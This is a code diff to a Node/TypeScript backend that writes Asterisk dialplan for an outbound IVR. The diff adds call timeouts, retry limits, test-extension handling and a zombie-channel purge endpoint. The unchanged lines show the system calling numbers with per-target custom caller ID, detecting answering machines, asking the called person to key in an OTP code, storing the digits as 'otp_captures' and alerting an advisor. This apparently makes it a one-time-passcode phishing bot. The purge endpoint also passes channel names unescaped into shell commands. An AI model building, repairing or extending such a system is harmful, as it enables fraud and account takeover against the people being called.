@@ -2081,6 +2081,7 @@ export function generateCleanDialplanConf(
   dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
   dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(absolute)=120)\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=8888)\n`;
@@ -2094,12 +2095,16 @@ export function generateCleanDialplanConf(
 
   dialplanContent += `; 2c. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
   dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(absolute)=120)\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
   dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n`;
   dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(absolute)=120)\n`;
   dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
@@ -3012,6 +3017,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-press1,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(absolute)=180)\n`;
+  dialplanContent += ` same => n,Set(IVR_LOOP_COUNT=0)\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
@@ -3025,9 +3032,16 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,/var/lib/asterisk/sounds/,)})\n`;
   dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,/usr/share/asterisk/sounds/,)})\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-AUDIO] Reproduciendo Audio Intro: \${IVR_INTRO} para Destino: \${TARGET_DEST} ===)\n`;
-  dialplanContent += ` same => n(menu),Background(\${IVR_INTRO})\n`;
+  dialplanContent += ` same => n(menu),Set(IVR_LOOP_COUNT=$[\${IVR_LOOP_COUNT} + 1])\n`;
+  dialplanContent += ` same => n,GotoIf($[\${IVR_LOOP_COUNT} > 2]?max_timeouts_press1)\n`;
+  dialplanContent += ` same => n,Background(\${IVR_INTRO})\n`;
   dialplanContent += ` same => n,WaitExten(4)\n`;
   dialplanContent += ` same => n,Goto(menu)\n\n`;
+  dialplanContent += ` same => n(max_timeouts_press1),NoOp(=== [IVR-PRESS1] Maximo reintentos de espera superados (sin DTMF) -> Colgando canal ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=timeout)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=timeout&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(amd_machine_press1),NoOp(=== [AMD-OPERADORA] Operadora automatica o contestador detectado en \${TARGET_DEST} -> Colgando y reintentando ===)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=machine_detected&cause=\${AMDCAUSE}&channel=\${CHANNEL}" &)\n`;
@@ -3069,9 +3083,15 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Dial(\${GLOBAL_RINGALL_EXTENSIONS},60,Ttb(sub-audio-quality^s^1)U(sub-record-picked-agent^\${TARGET_NUM}^\${CALLERID(num)}))\n`;
   dialplanContent += ` same => n(press1_finish),Hangup()\n\n`;
 
-  dialplanContent += `exten => i,1,Playback(custom/opcion_invalida)\n`;
+  dialplanContent += `exten => i,1,NoOp(=== [IVR-PRESS1] Opcion invalida ===)\n`;
+  dialplanContent += ` same => n,Set(IVR_LOOP_COUNT=$[\${IVR_LOOP_COUNT} + 1])\n`;
+  dialplanContent += ` same => n,GotoIf($[\${IVR_LOOP_COUNT} > 2]?s,max_timeouts_press1)\n`;
+  dialplanContent += ` same => n,Playback(custom/opcion_invalida)\n`;
   dialplanContent += ` same => n,Goto(s,menu)\n\n`;
-  dialplanContent += `exten => t,1,Goto(s,menu)\n\n`;
+  dialplanContent += `exten => t,1,NoOp(=== [IVR-PRESS1] Timeout WaitExten ===)\n`;
+  dialplanContent += ` same => n,Set(IVR_LOOP_COUNT=$[\${IVR_LOOP_COUNT} + 1])\n`;
+  dialplanContent += ` same => n,GotoIf($[\${IVR_LOOP_COUNT} > 2]?s,max_timeouts_press1)\n`;
+  dialplanContent += ` same => n,Goto(s,menu)\n\n`;
 
   dialplanContent += `exten => h,1,NoOp(=== [IVR-PRESS1 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -3097,6 +3117,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-otp,Channel=\${CHANNEL})\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
+  dialplanContent += ` same => n,Set(TIMEOUT(absolute)=180)\n`;
+  dialplanContent += ` same => n,Set(OTP_LOOP_COUNT=0)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})\n`;
   dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})\n`;
@@ -3159,13 +3181,19 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Goto(ask_input)\n\n`;
 
   dialplanContent += ` ; Solicitud de codigo o presion de tecla 1\n`;
-  dialplanContent += ` same => n(ask_input),NoOp(=== [IVR] Solicitando Codigo OTP o Presione 1: \${IVR_PROMPT} ===)\n`;
+  dialplanContent += ` same => n(ask_input),Set(OTP_LOOP_COUNT=$[\${OTP_LOOP_COUNT} + 1])\n`;
+  dialplanContent += ` same => n,GotoIf($[\${OTP_LOOP_COUNT} > 2]?max_timeouts_otp)\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR] Solicitando Codigo OTP o Presione 1: \${IVR_PROMPT} (Intento \${OTP_LOOP_COUNT}) ===)\n`;
   dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
   dialplanContent += ` same => n,Background(\${IVR_PROMPT})\n`;
   dialplanContent += ` same => n,WaitExten(4)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
   dialplanContent += ` same => n,WaitExten(4)\n`;
   dialplanContent += ` same => n,Goto(ask_input)\n\n`;
+  dialplanContent += ` same => n(max_timeouts_otp),NoOp(=== [IVR-OTP] Maximo reintentos de captura superados -> Colgando canal ===)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=timeout)\n`;
+  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=timeout&channel=\${CHANNEL}" &)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += ` same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
@@ -3336,6 +3364,9 @@ async function autoRepairAsteriskPjsipOnStartup() {
       fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8');
       await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
       exec('asterisk -rx "dialplan reload"', () => {});
+      // Purge any stuck zombie Local/8888 test channels from previous sessions
+      exec('asterisk -rx "channel request hangup Local/8888" 2>/dev/null', () => {});
+      exec('asterisk -rx "hangup request Local/8888" 2>/dev/null', () => {});
     } catch (_) {}
 
     // Initialize default action in AstDB to ivr-press1
@@ -4144,7 +4175,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     // If <= 4 digits (and not IVR extension), direct SIP endpoint (e.g. agent phone 1001)
     // Otherwise standard outbound call via Local NANP routing
     let channel = '';
-    if (['8888', '7777', '6666', '5555', '4444', '3333', '333', '777'].includes(cleanDest)) {
+    if (['8888', '7777', '6666', '5555', '4444', '3333', '333', '777', '8880', '*8888'].includes(cleanDest) || cleanDest.endsWith('8888')) {
       channel = `PJSIP/${(agentExten && agentExten !== 'ringall' && agentExten !== 'all') ? agentExten : '1001'}`;
     } else if (cleanDest.length <= 4) {
       channel = `PJSIP/${cleanDest}`;
@@ -7031,7 +7062,7 @@ app.post('/api/asterisk/call/hangup', async (req, res) => {
             let isMatch = false;
             if (all) {
               isMatch = true;
-            } else if (clean10 && clean10.length >= 7) {
+            } else if (clean10 && clean10.length >= 3) {
               if (
                 line.includes(clean10) ||
                 (formattedDest && line.includes(formattedDest)) ||
@@ -7039,7 +7070,9 @@ app.post('/api/asterisk/call/hangup', async (req, res) => {
                 chName.includes(clean10) ||
                 chExten.includes(clean10) ||
                 chData.includes(clean10) ||
-                chCid.includes(clean10)
+                chCid.includes(clean10) ||
+                (clean10 === '8888' && (chName.includes('8888') || chExten === '8888')) ||
+                (clean10 === '7777' && (chName.includes('7777') || chExten === '7777'))
               ) {
                 isMatch = true;
               }
@@ -7152,6 +7185,43 @@ app.post('/api/asterisk/call/hangup', async (req, res) => {
       message: `Llamada colgada exitosamente.`,
       channelsHungup: hungupList,
     });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Endpoint to purge zombie or orphan Local channels stuck in infinite loops
+app.post('/api/asterisk/call/purge-zombies', async (req, res) => {
+  try {
+    cliCommandCache.delete('core show channels concise');
+    const amiOutput = await executeAsteriskCommand('core show channels concise');
+    const killed: string[] = [];
+    if (amiOutput) {
+      const lines = amiOutput.split('\n');
+      for (const line of lines) {
+        const trimmed = line.trim();
+        if (!trimmed) continue;
+        const parts = trimmed.split('!');
+        const ch = parts[0] || '';
+        const ctx = parts[1] || '';
+        const ext = parts[2] || '';
+        if (ch.includes('8888') || ext === '8888' || ch.startsWith('Local/') || ctx === 'ivr-press1' || ctx === 'ivr-otp') {
+          await executeAsteriskCommand(`channel request hangup ${ch}`).catch(() => {});
+          await executeAsteriskCommand(`hangup request ${ch}`).catch(() => {});
+          if (hasLocalAsterisk) {
+            exec(`asterisk -rx "channel request hangup ${ch}" 2>/dev/null`, () => {});
+            exec(`asterisk -rx "hangup request ${ch}" 2>/dev/null`, () => {});
+          }
+          killed.push(ch);
+        }
+      }
+    }
+    // Also execute generic hangup for Local/8888 pattern
+    exec('asterisk -rx "channel request hangup Local/8888" 2>/dev/null', () => {});
+    exec('asterisk -rx "dialplan reload" 2>/dev/null', () => {});
+    cliCommandCache.delete('core show channels concise');
+    console.log(`[PURGE ZOMBIES] Canales huérfanos colgados:`, killed);
+    res.json({ success: true, message: `Se purgaron ${killed.length} canales huérfanos o en bucle.`, killed });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
